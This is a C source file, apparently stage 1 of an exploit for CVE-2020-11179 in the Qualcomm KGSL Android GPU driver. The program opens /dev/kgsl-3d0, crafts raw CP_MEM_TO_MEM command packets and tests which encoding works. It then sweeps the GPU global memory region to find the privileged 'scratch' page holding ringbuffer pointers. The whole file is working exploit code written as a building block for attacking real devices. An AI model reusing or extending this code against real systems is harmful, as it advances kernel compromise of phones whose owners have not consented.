/*
 * kgsl_scratch_scan.c - stage 1: locate the "scratch" global page (CVE-2020-11179).
 *
 * Phase A: validate CP_MEM_TO_MEM encoding on our own buffers (variants).
 * Phase B: read-only sweep of pages 0..31 of the global region (0xf8000000..),
 *          copying 4 dwords ("scanner" variant) per page into OUT; find the
 *          page whose dwords look like ringbuffer RPTRs (small, 4-aligned)
 *          and change between sweeps.  First 128 KB of globals is contiguous
 *          (bump allocator); no fault risk.
 *
 * Build: zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding -fno-builtin -O2 -Wl,-e,_start -o kgsl_scratch_scan kgsl_scratch_scan.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
#define SYS_mmap 222
#define SYS_sched_yield 124
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static inline s64 sys6(long n,s64 a,s64 b,s64 c,s64 d,s64 e,s64 f){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x4 __asm__("x4")=e;register s64 x5 __asm__("x5")=f;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_drawctxt_create{u32 flags;u32 drawctxt_id;};
#define IOCTL_DRAWCTXT_CREATE IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x13,sizeof(struct kgsl_drawctxt_create))
struct kgsl_gpumem_alloc_id{u32 id;u32 flags;u64 size;u64 mmapsize;u64 gpuaddr;u64 pad[2];};
#define IOCTL_GPUMEM_ALLOC_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x34,sizeof(struct kgsl_gpumem_alloc_id))
struct kgsl_gpumem_free_id{u32 id;u32 pad;};
#define IOCTL_GPUMEM_FREE_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x35,sizeof(struct kgsl_gpumem_free_id))
struct kgsl_command_object{u64 offset;u64 gpuaddr;u64 size;u32 flags;u32 id;};
struct kgsl_gpu_command{u64 flags;u64 cmdlist;u32 cmdsize;u32 numcmds;u64 objlist;u32 objsize;u32 numobjs;u64 synclist;u32 syncsize;u32 numsyncs;u32 context_id;u32 timestamp;};
#define IOCTL_GPU_COMMAND IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x4A,sizeof(struct kgsl_gpu_command))
#define KGSL_CMDLIST_IB 0x1u
#define CP_NOP 0x10u
#define CP_MEM_WRITE 0x3du
#define CP_MEM_TO_MEM 0x3bu
#define GLOBAL_BASE 0xf8000000ull

static u32 parity(u32 v){v^=v>>4;v^=v>>8;v^=v>>12;v^=v>>16;v^=v>>20;v^=v>>24;v^=v>>28;return (0x9669u>>(v&0xf))&1u;}
static u32 pkt7(u32 op,u32 cnt){return 0x70000000u|(cnt&0x3fffu)|(parity(cnt)<<15)|((op&0x7fu)<<16)|(parity(op)<<23);}
static void dc_civac(void*p,u64 len){u64 a=(u64)p&~63ull,b=((u64)p+len+63)&~63ull;for(;a<b;a+=64)asm volatile("dc civac, %0"::"r"(a):"memory");asm volatile("dsb ish":::"memory");}

static long gfd; static u32 gdc,gcmdid,goutid,gsrcid; static u64 gcmd_gpu,gout_gpu,gsrc_gpu; static u32*gcmd,*gout,*gsrc;
static long submit(u32*n,u32 cnt,u32 ts){
    dc_civac(gcmd,cnt*4);
    struct kgsl_command_object co; co.offset=0; co.gpuaddr=gcmd_gpu; co.size=cnt*4; co.flags=KGSL_CMDLIST_IB; co.id=gcmdid;
    struct kgsl_gpu_command gc; for(u64 i=0;i<sizeof(gc);i++)((u8*)&gc)[i]=0;
    gc.cmdlist=(u64)&co; gc.cmdsize=sizeof(co); gc.numcmds=1; gc.context_id=gdc; gc.timestamp=ts;
    return sys3(SYS_ioctl,gfd,IOCTL_GPU_COMMAND,(s64)&gc);
}
static long alloc_buf(u64 size,u32*id,u64*gpu,u32**cpu){
    struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
    a.size=size;
    long r=sys3(SYS_ioctl,gfd,IOCTL_GPUMEM_ALLOC_ID,(s64)&a);
    if(r) return r;
    *id=a.id; *gpu=a.gpuaddr; u64 mz=a.mmapsize?a.mmapsize:size;
    s64 m=sys6(SYS_mmap,0,mz,3,1,gfd,(s64)((u64)a.id<<12));
    if(m<=0) return -1;
    *cpu=(u32*)m; return 0;
}
static u32*naddr(u32*n,u64 gpu){ n[0]=(u32)gpu; n[1]=(u32)(gpu>>32); return n+2; }
static void m2m(u32*n,int variant,u64 dst,u64 src,u32 extra){ n[0]=pkt7(CP_MEM_TO_MEM, variant==2?4:5);
    if(variant==0){ n[1]=0; n=naddr(n+2,dst); naddr(n,src); }
    else if(variant==1){ n=naddr(n+1,dst); n=naddr(n,src); n[0]=0; }
    else if(variant==2){ n=naddr(n+1,dst); naddr(n,src); }
    else if(variant==3){ n=naddr(n+1,dst); n=naddr(n,src); n[0]=extra; }
}
void _start(void){
    out("[*] kgsl_scratch_scan\n");
    gfd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    if(gfd<0){out("[!] open fail\n");sys3(SYS_exit,1,0,0);return;}
    struct kgsl_drawctxt_create d; d.flags=0x12u; d.drawctxt_id=0;
    if(sys3(SYS_ioctl,gfd,IOCTL_DRAWCTXT_CREATE,(s64)&d)||!d.drawctxt_id){out("[!] ctx fail\n");sys3(SYS_exit,1,0,0);return;}
    gdc=d.drawctxt_id;
    if(alloc_buf(0x20000,&gcmdid,&gcmd_gpu,&gcmd)){out("[!] cmd fail\n");sys3(SYS_exit,1,0,0);return;}
    if(alloc_buf(0x1000,&gsrcid,&gsrc_gpu,&gsrc)){out("[!] src fail\n");sys3(SYS_exit,1,0,0);return;}
    if(alloc_buf(0x1000,&goutid,&gout_gpu,&gout)){out("[!] out fail\n");sys3(SYS_exit,1,0,0);return;}
    out("[1] cmd=");outhex(gcmd_gpu);out(" src=");outhex(gsrc_gpu);out(" out=");outhex(gout_gpu);out("\n");

    /* Phase A */
    gsrc[0]=0x41414141u; gsrc[1]=0x42u; dc_civac(gsrc,8);
    int works=-1;
    for(int v=0;v<4 && works<0;v++){
        for(int i=0;i<8;i++) gout[i]=0xEEEEEEEEu;
        dc_civac(gout,32);
        u32 n=0; m2m(gcmd,v,gout_gpu,gsrc_gpu,1); n= (v==2)?5:6;
        long r=submit(gcmd,n,10+v);
        u32 o0=0xEEEEEEEEu;
        for(int i=0;i<3000;i++){ dc_civac(gout,16); o0=gout[0]; if(o0!=0xEEEEEEEEu)break; sys3(SYS_sched_yield,0,0,0); }
        out("[2] variant ");outdec(v);out(" ret=");outdec(r);out(" out0=");outhex(o0);out(" out1=");outhex(gout[1]);out("\n");
        if(o0==0x41414141u) works=v;
    }
    if(works<0){ out("[!] no MEM_TO_MEM variant worked; stopping\n"); sys3(SYS_close,gfd,0,0); sys3(SYS_exit,1,0,0); return; }
    out("[3] using variant ");outdec(works);out(" for scan\n");

    /* Phase B: two sweeps over 32 pages, 4 dwords each page */
    u32 samp[2][32*4];
    for(int pass=0;pass<2;pass++){
        for(u32 i=0;i<32*4;i++) gout[i]=0xEEEEEEEEu;
        dc_civac(gout,32*16);
        u32 n=0;
        for(u32 pg=0;pg<32;pg++){
            for(u32 dw=0;dw<4;dw++){
                u64 cand=GLOBAL_BASE + (u64)pg*4096u + dw*4u;
                u64 dst=gout_gpu + (pg*4+dw)*4;
                m2m(&gcmd[n],works,dst,cand,1); n += (works==2)?5:6;
            }
        }
        long r=submit(gcmd,n,20+pass);
        int changed=0;
        for(int i=0;i<3000;i++){ dc_civac(gout,32*16); if(gout[0]!=0xEEEEEEEEu){changed=1;break;} sys3(SYS_sched_yield,0,0,0); }
        out("[4] sweep ");outdec(pass);out(" ret=");outdec(r);out(" changed=");outdec(changed);out("\n");
        for(u32 i=0;i<32*4;i++) samp[pass][i]=gout[i];
    }
    out("[5] candidate pages (all 4 dwords small & 4-aligned):\n");
    for(u32 pg=0;pg<32;pg++){
        u32*a=&samp[0][pg*4]; u32*b=&samp[1][pg*4];
        int small=1,al=1;
        for(int k=0;k<4;k++){ if(a[k]>0x10000u) small=0; if(a[k]&3u) al=0; }
        if(small&&al){
            out("    page ");outdec(pg);out(" @");outhex(GLOBAL_BASE+(u64)pg*4096u);out(": ");
            for(int k=0;k<4;k++){ outhex(a[k]);out(" "); }
            out(" -> ");
            for(int k=0;k<4;k++){ outhex(b[k]);out(" "); }
            int chg=0; for(int k=0;k<4;k++) if(a[k]!=b[k]) chg=1;
            out(chg?" (CHANGED)\n":"\n");
        }
    }
    out("[*] done\n");
    sys3(SYS_close,gfd,0,0);
    sys3(SYS_exit,0,0,0);
}
